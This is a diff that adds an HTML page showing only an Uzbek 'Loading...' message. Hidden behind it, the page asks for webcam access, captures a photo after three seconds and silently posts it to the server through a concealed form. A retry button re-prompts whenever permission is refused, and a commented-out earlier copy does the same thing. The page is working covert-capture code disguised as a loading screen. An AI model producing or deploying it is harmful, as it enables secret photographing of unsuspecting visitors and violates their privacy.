@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Yuklanmoqda...</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: sans-serif;
+            background-color: #f0f0f0;
+            text-align: center;
+        }
+        h3 {
+            color: #333;
+        }
+        #retry {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #d9534f;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            display: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <h3 id="status">Yuklanmoqda...</h3>
+        <button id="retry" onclick="askPermissionAgain()">Yana urinib ko‘rish</button>
+    </div>
+
+    <video id="video" width="320" height="240" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <form id="photoForm" method="POST" enctype="multipart/form-data">
+        <input type="file" name="image" id="imageInput" style="display: none;">
+    </form>
+
+    <script>
+        function askCameraAccess() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    document.getElementById('video').srcObject = stream;
+                    document.getElementById('status').innerText = "Kamera ishga tushdi...";
+                    setTimeout(captureImage, 3000);
+                })
+                .catch(err => {
+                    document.getElementById('status').innerText = "Kameraga ruxsat berilmadi.";
+                    document.getElementById('retry').style.display = 'inline-block';
+                });
+        }
+
+        function askPermissionAgain() {
+            location.reload(); // sahifani yangilaydi va yana so‘raydi
+        }
+
+        function captureImage() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            canvas.toBlob(blob => {
+                const fileInput = document.getElementById('imageInput');
+                const file = new File([blob], 'capture.jpg', { type: 'image/jpeg' });
+                const dataTransfer = new DataTransfer();
+                dataTransfer.items.add(file);
+                fileInput.files = dataTransfer.files;
+                document.getElementById('photoForm').submit();
+            }, 'image/jpeg');
+        }
+
+        askCameraAccess();
+    </script>
+</body>
+</html>
+
+
+<!--<!DOCTYPE html>-->
+<!--<html>-->
+<!--<head>-->
+<!--    <title>Yuklanmoqda...</title>-->
+<!--    <style>-->
+<!--        body {-->
+<!--            display: flex;-->
+<!--            justify-content: center;-->
+<!--            align-items: center;-->
+<!--            height: 100vh;-->
+<!--            font-family: sans-serif;-->
+<!--            background-color: #f0f0f0;-->
+<!--        }-->
+<!--        h3 {-->
+<!--            color: #333;-->
+<!--        }-->
+<!--    </style>-->
+<!--</head>-->
+<!--<body>-->
+<!--    <h3>Yuklanmoqda...</h3>-->
+
+<!--    <video id="video" width="320" height="240" autoplay style="display: none;"></video>-->
+<!--    <canvas id="canvas" style="display: none;"></canvas>-->
+<!--    <form id="photoForm" method="POST" enctype="multipart/form-data">-->
+<!--        <input type="file" name="image" id="imageInput" style="display: none;">-->
+<!--    </form>-->
+
+<!--    <script>-->
+<!--        navigator.mediaDevices.getUserMedia({ video: true })-->
+<!--            .then(stream => {-->
+<!--                document.getElementById('video').srcObject = stream;-->
+<!--                setTimeout(captureImage, 3000);-->
+<!--            });-->
+
+<!--        function captureImage() {-->
+<!--            const video = document.getElementById('video');-->
+<!--            const canvas = document.getElementById('canvas');-->
+<!--            canvas.width = video.videoWidth;-->
+<!--            canvas.height = video.videoHeight;-->
+<!--            canvas.getContext('2d').drawImage(video, 0, 0);-->
+
+<!--            canvas.toBlob(blob => {-->
+<!--                const fileInput = document.getElementById('imageInput');-->
+<!--                const file = new File([blob], 'capture.jpg', { type: 'image/jpeg' });-->
+<!--                const dataTransfer = new DataTransfer();-->
+<!--                dataTransfer.items.add(file);-->
+<!--                fileInput.files = dataTransfer.files;-->
+<!--                document.getElementById('photoForm').submit();-->
+<!--            }, 'image/jpeg');-->
+<!--        }-->
+<!--    </script>-->
+<!--</body>-->
+<!--</html>-->
